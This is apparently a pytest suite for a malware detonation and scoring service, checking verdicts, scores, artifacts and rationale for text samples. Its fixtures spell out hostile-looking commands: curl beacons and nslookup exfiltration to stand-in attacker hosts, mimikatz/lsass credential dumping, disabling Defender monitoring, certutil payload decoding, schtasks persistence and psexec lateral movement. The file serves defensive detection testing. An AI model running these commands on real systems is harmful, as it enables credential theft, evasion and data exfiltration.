from __future__ import annotations

import hashlib

import pytest

from app.services.detonationservice import (
    BEHAVIOR_BONUSES,
    FILE_PATTERNS,
    NETWORK_PATTERNS,
    PROCESS_PATTERNS,
    DetonationArtifact,
    DetonationAssessment,
    DetonationService,
    DetonationSignal,
    build_detonation_service,
)

# ---------- Fixtures ----------


@pytest.fixture()
def svc() -> DetonationService:
    return build_detonation_service()


# ---------- build_detonation_service ----------


def test_build_detonation_service_returns_instance() -> None:
    instance = build_detonation_service()
    assert isinstance(instance, DetonationService)


# ---------- detonate_text — clean payload ----------


def test_detonate_text_clean_payload_allow_verdict(svc: DetonationService) -> None:
    result = svc.detonate_text("Hello world, this is a benign document.")
    assert result.verdict == "allow"
    assert result.severity == "low"
    assert result.score == 0.0
    assert result.signals == []


def test_detonate_text_clean_payload_sha256_correct(svc: DetonationService) -> None:
    text = "clean content"
    result = svc.detonate_text(text)
    expected = hashlib.sha256(text.encode("utf-8")).hexdigest()
    assert result.sample_sha256 == expected


def test_detonate_text_clean_payload_low_confidence(svc: DetonationService) -> None:
    result = svc.detonate_text("nothing suspicious here")
    assert result.confidence == 0.18


def test_detonate_text_returns_detonation_assessment(svc: DetonationService) -> None:
    result = svc.detonate_text("harmless text")
    assert isinstance(result, DetonationAssessment)


def test_detonate_text_behavior_tags_empty_for_clean(svc: DetonationService) -> None:
    result = svc.detonate_text("nothing here")
    assert result.behavior_tags == []


# ---------- detonate_text — network signals ----------


def test_detonate_text_detects_known_c2_port(svc: DetonationService) -> None:
    result = svc.detonate_text("connecting to host on port 4444")
    names = {s.name for s in result.signals}
    assert "known_c2_port" in names


def test_detonate_text_detects_http_beacon(svc: DetonationService) -> None:
    result = svc.detonate_text("curl https://evil.example.com/callback")
    names = {s.name for s in result.signals}
    assert "http_beacon" in names


def test_detonate_text_detects_tor_indicator(svc: DetonationService) -> None:
    result = svc.detonate_text("connecting to abc123.onion for exfil")
    names = {s.name for s in result.signals}
    assert "tor_indicator" in names


def test_detonate_text_detects_dns_tunneling(svc: DetonationService) -> None:
    result = svc.detonate_text("nslookup -q=txt exfil.attacker.com")
    names = {s.name for s in result.signals}
    assert "dns_tunneling" in names


# ---------- detonate_text — process signals ----------


def test_detonate_text_detects_credential_access(svc: DetonationService) -> None:
    result = svc.detonate_text("dumping lsass memory for creds")
    names = {s.name for s in result.signals}
    assert "credential_access" in names


def test_detonate_text_detects_defense_evasion(svc: DetonationService) -> None:
    result = svc.detonate_text("Set-MpPreference -DisableRealtimeMonitoring $true")
    names = {s.name for s in result.signals}
    assert "defense_evasion" in names


def test_detonate_text_detects_lolbin_chain(svc: DetonationService) -> None:
    result = svc.detonate_text("certutil -decode payload.txt payload.exe")
    names = {s.name for s in result.signals}
    assert "lolbin_chain" in names


def test_detonate_text_detects_persistence(svc: DetonationService) -> None:
    result = svc.detonate_text("schtasks /create /tn updater /tr malware.exe")
    names = {s.name for s in result.signals}
    assert "persistence" in names


def test_detonate_text_detects_lateral_movement(svc: DetonationService) -> None:
    result = svc.detonate_text("psexec \\\\192.168.1.10 cmd.exe")
    names = {s.name for s in result.signals}
    assert "lateral_movement" in names


# ---------- detonate_text — file signals ----------


def test_detonate_text_detects_drops_executable(svc: DetonationService) -> None:
    result = svc.detonate_text(r"WriteFile temp\payload.exe dropper")
    names = {s.name for s in result.signals}
    assert "drops_executable" in names


def test_detonate_text_detects_self_delete(svc: DetonationService) -> None:
    result = svc.detonate_text("del /f /q malware.exe")
    names = {s.name for s in result.signals}
    assert "self_delete" in names


def test_detonate_text_detects_archive_unpack(svc: DetonationService) -> None:
    result = svc.detonate_text("zip extract archive.zip to temp/")
    names = {s.name for s in result.signals}
    assert "archive_unpack" in names


# ---------- detonate_text — verdict thresholds ----------


def test_detonate_text_monitor_verdict_at_medium_score(svc: DetonationService) -> None:
    result = svc.detonate_text("certutil -decode payload.txt out.exe")
    assert result.verdict in {"monitor", "review", "block"}
    assert result.score >= 0.22


def test_detonate_text_review_verdict_high_score(svc: DetonationService) -> None:
    payload = "lsass dump via mimikatz\nSet-MpPreference -DisableRealtimeMonitoring $true\ncertutil -decode payload.txt out.exe\ncurl https://c2.attacker.com/beacon\n"
    result = svc.detonate_text(payload)
    assert result.verdict in {"review", "block"}
    assert result.score >= 0.56


def test_detonate_text_block_verdict_critical_payload(svc: DetonationService) -> None:
    payload = (
        "lsass dump via mimikatz sekurlsa\n"
        "Set-MpPreference -DisableRealtimeMonitoring $true\n"
        "certutil -decode payload.txt temp\\payload.exe\n"
        "curl https://evil.com/beacon on port 4444\n"
        "schtasks /create /tn updater /tr malware.exe\n"
        "psexec \\\\192.168.1.2 cmd.exe\n"
        "connecting to abc.onion for exfil\n"
        "del /f /q dropper.exe\n"
    )
    result = svc.detonate_text(payload)
    assert result.verdict == "block"
    assert result.severity == "critical"
    assert result.score >= 0.82


# ---------- detonate_text — score cap ----------


def test_detonate_text_score_never_exceeds_1(svc: DetonationService) -> None:
    payload = "\n".join(
        [
            "lsass mimikatz sekurlsa sam hive",
            "Set-MpPreference -DisableRealtimeMonitoring $true",
            "certutil -decode payload.txt temp\\payload.exe",
            "curl https://evil.com/beacon port 4444 1337 8081 9001",
            "schtasks /create psexec wmic /node net use \\\\ winrm",
            "connecting to abc.onion dns tunnel nslookup -q=txt",
            "del /f /q self-delete remove-item . -force",
            "zip extract unpack inflate resource",
        ]
    )
    result = svc.detonate_text(payload)
    assert result.score <= 1.0


# ---------- detonate_text — behavior bonuses ----------


def test_behavior_bonus_credential_plus_defense_evasion(svc: DetonationService) -> None:
    payload = "lsass mimikatz credential dump\nSet-MpPreference -DisableRealtimeMonitoring $true\n"
    result = svc.detonate_text(payload)
    names = {s.name for s in result.signals}
    assert "credential_access" in names
    assert "defense_evasion" in names
    assert result.score > 0.34 + 0.28


def test_behavior_bonus_lolbin_plus_http_beacon(svc: DetonationService) -> None:
    payload = "certutil -decode payload.txt out.exe\ncurl https://c2.attacker.com/callback\n"
    result = svc.detonate_text(payload)
    names = {s.name for s in result.signals}
    assert "lolbin_chain" in names
    assert "http_beacon" in names
    assert result.score >= 0.22 + 0.16 + 0.12


# ---------- detonate_bytes ----------


def test_detonate_bytes_delegates_to_detonate_text(svc: DetonationService) -> None:
    payload_bytes = b"lsass dump via mimikatz"
    result = svc.detonate_bytes(payload_bytes)
    assert isinstance(result, DetonationAssessment)
    names = {s.name for s in result.signals}
    assert "credential_access" in names


def test_detonate_bytes_sha256_matches_raw_bytes(svc: DetonationService) -> None:
    payload_bytes = b"hello world"
    result = svc.detonate_bytes(payload_bytes)
    expected = hashlib.sha256(payload_bytes).hexdigest()
    assert result.sample_sha256 == expected


def test_detonate_bytes_clean_returns_allow(svc: DetonationService) -> None:
    result = svc.detonate_bytes(b"totally benign content")
    assert result.verdict == "allow"


def test_detonate_bytes_sandbox_profile_forwarded(svc: DetonationService) -> None:
    result = svc.detonate_bytes(b"clean", sandbox_profile="linux-headless")
    assert result.sandbox_profile == "linux-headless"


def test_detonate_bytes_file_name_forwarded(svc: DetonationService) -> None:
    result = svc.detonate_bytes(b"clean content", file_name="sample.pdf")
    assert any(a.path == "sample.pdf" for a in result.artifacts)


# ---------- detonate_text — artifacts ----------


def test_artifacts_drops_executable_signal(svc: DetonationService) -> None:
    result = svc.detonate_text(r"WriteFile temp\payload.exe dropper")
    artifact_types = {a.artifact_type for a in result.artifacts}
    assert "dropped_file" in artifact_types


def test_artifacts_persistence_signal(svc: DetonationService) -> None:
    result = svc.detonate_text("schtasks /create /tn updater /tr malware.exe")
    artifact_types = {a.artifact_type for a in result.artifacts}
    assert "registry_persistence" in artifact_types


def test_artifacts_http_beacon_signal(svc: DetonationService) -> None:
    result = svc.detonate_text("curl https://evil.com/c2")
    artifact_types = {a.artifact_type for a in result.artifacts}
    assert "network_connection" in artifact_types


def test_artifacts_tor_indicator_signal(svc: DetonationService) -> None:
    result = svc.detonate_text("abc.onion exfil channel active")
    artifact_types = {a.artifact_type for a in result.artifacts}
    assert "network_connection" in artifact_types


def test_artifacts_credential_access_signal(svc: DetonationService) -> None:
    result = svc.detonate_text("lsass dump via mimikatz")
    artifact_types = {a.artifact_type for a in result.artifacts}
    assert "process_access" in artifact_types


def test_artifacts_submitted_sample_fallback(svc: DetonationService) -> None:
    result = svc.detonate_text("nothing suspicious", file_name="benign.pdf")
    assert any(a.artifact_type == "submitted_sample" for a in result.artifacts)
    assert any(a.path == "benign.pdf" for a in result.artifacts)


def test_artifacts_empty_when_no_signals_no_filename(svc: DetonationService) -> None:
    result = svc.detonate_text("benign content with no signals")
    assert result.artifacts == []


# ---------- detonate_text — rationale ----------


def test_rationale_contains_sandbox_profile(svc: DetonationService) -> None:
    result = svc.detonate_text("clean", sandbox_profile="linux-headless")
    assert any("linux-headless" in r for r in result.rationale)


def test_rationale_contains_verdict(svc: DetonationService) -> None:
    result = svc.detonate_text("lsass dump via mimikatz")
    assert any("verdict" in r.lower() or result.verdict in r for r in result.rationale)


def test_rationale_no_suspicious_message_for_clean(svc: DetonationService) -> None:
    result = svc.detonate_text("harmless text only")
    assert any("No suspicious" in r for r in result.rationale)


# ---------- detonate_text — confidence ----------


def test_confidence_increases_with_more_signals(svc: DetonationService) -> None:
    clean = svc.detonate_text("nothing here")
    dirty = svc.detonate_text("lsass mimikatz certutil psexec schtasks")
    assert dirty.confidence > clean.confidence


def test_confidence_bounded_below_1(svc: DetonationService) -> None:
    payload = "lsass mimikatz sekurlsa sam hive\nSet-MpPreference -DisableRealtimeMonitoring $true\ncertutil psexec schtasks wmic winrm mshta rundll32 regsvr32\ncurl https://c2.evil.com port 4444\nabc.onion dns tunnel nslookup -q=txt\n" * 10
    result = svc.detonate_text(payload)
    assert result.confidence < 1.0


# ---------- detonate_text — execution_time_ms ----------


def test_execution_time_ms_is_positive(svc: DetonationService) -> None:
    result = svc.detonate_text("benign content")
    assert result.execution_time_ms > 0


def test_execution_time_ms_deterministic(svc: DetonationService) -> None:
    text = "lsass mimikatz certutil psexec"
    r1 = svc.detonate_text(text)
    r2 = svc.detonate_text(text)
    assert r1.execution_time_ms == r2.execution_time_ms
    assert r1.sample_sha256 == r2.sample_sha256


# ---------- detonate_text — sandbox_profile ----------


def test_sandbox_profile_default_is_windows_office_user(svc: DetonationService) -> None:
    result = svc.detonate_text("benign")
    assert result.sandbox_profile == "windows-office-user"


def test_sandbox_profile_custom_is_preserved(svc: DetonationService) -> None:
    result = svc.detonate_text("benign", sandbox_profile="android-emulator")
    assert result.sandbox_profile == "android-emulator"


# ---------- DetonationAssessment.as_dict ----------


def test_as_dict_shape_for_clean_payload(svc: DetonationService) -> None:
    result = svc.detonate_text("harmless").as_dict()
    for key in (
        "verdict",
        "severity",
        "score",
        "confidence",
        "sample_sha256",
        "sandbox_profile",
        "execution_time_ms",
        "signals",
        "artifacts",
        "behavior_tags",
        "rationale",
        "detonated_at",
    ):
        assert key in result


def test_as_dict_signals_structure(svc: DetonationService) -> None:
    result = svc.detonate_text("lsass dump via mimikatz")
    d = result.as_dict()
    assert len(d["signals"]) > 0
    for sig in d["signals"]:
        assert "name" in sig
        assert "category" in sig
        assert "weight" in sig
        assert "evidence" in sig


def test_as_dict_artifacts_structure(svc: DetonationService) -> None:
    result = svc.detonate_text("lsass dump via mimikatz")
    d = result.as_dict()
    for art in d["artifacts"]:
        assert "path" in art
        assert "artifact_type" in art
        assert "risk" in art


def test_as_dict_behavior_tags_sorted(svc: DetonationService) -> None:
    result = svc.detonate_text("lsass mimikatz certutil psexec schtasks")
    d = result.as_dict()
    assert d["behavior_tags"] == sorted(d["behavior_tags"])


# ---------- DetonationSignal / DetonationArtifact dataclasses ----------


def test_detonation_signal_fields() -> None:
    sig = DetonationSignal(name="test", category="network", weight=0.5, evidence="found")
    assert sig.name == "test"
    assert sig.category == "network"
    assert sig.weight == 0.5
    assert sig.evidence == "found"


def test_detonation_artifact_fields() -> None:
    art = DetonationArtifact(path="/tmp/x.exe", artifact_type="dropped_file", risk="high")
    assert art.path == "/tmp/x.exe"
    assert art.artifact_type == "dropped_file"
    assert art.risk == "high"


# ---------- Pattern coverage sanity ----------


def test_all_network_pattern_names_present_in_module() -> None:
    assert set(NETWORK_PATTERNS.keys()) == {"known_c2_port", "dns_tunneling", "http_beacon", "tor_indicator"}


def test_all_process_pattern_names_present_in_module() -> None:
    assert set(PROCESS_PATTERNS.keys()) == {"credential_access", "defense_evasion", "lolbin_chain", "persistence", "lateral_movement"}


def test_all_file_pattern_names_present_in_module() -> None:
    assert set(FILE_PATTERNS.keys()) == {"drops_executable", "archive_unpack", "self_delete"}


def test_behavior_bonuses_all_combos_are_tuples() -> None:
    for combo, value in BEHAVIOR_BONUSES.items():
        assert isinstance(combo, tuple)
        assert len(combo) == 2
        assert isinstance(value, float)
